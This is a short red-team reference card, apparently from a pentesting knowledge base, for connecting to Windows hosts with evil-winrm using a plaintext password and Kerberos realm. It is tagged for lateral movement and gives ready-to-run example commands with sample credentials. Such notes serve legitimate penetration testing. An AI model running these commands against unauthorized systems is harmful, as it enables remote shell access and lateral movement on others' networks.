---
type: command
executor: bash
data: evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD -r $_REALM
output: null
platforms:
  - Windows
tags:
  - winrm
  - lateral-movement
verified: true
validated: true
---

# evil-winrm-connect-with-password-and-realm

## Command

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD -r $_REALM
```

## Description

Establishes a WinRM shell using plaintext password authentication with a Kerberos realm (domain), suitable for domain-joined targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i, --ip | Target IP address | Yes |
| -u, --user | Username | Yes |
| -p, --password | Plaintext password | Yes |
| -r, --realm | Kerberos realm/domain (e.g., domain.local) | Yes |
| -P, --port | Port (default 5985) | No |

## Examples

### Basic Usage

```bash
evil-winrm -i 10.0.0.20 -u administrator -p Summer19 -r domain.local
```

### With Custom Port

```bash
evil-winrm -i 10.0.0.20 -u admin -p pass -r corp.com -P 5985
```

## Expected Output

Evil-WinRM v3.0

*Evil-WinRM* PS C:\Windows\system32> 

## Related

- [[procedures/windows-winrm-credential-access]]
- [[tools/Evil-WinRM]]
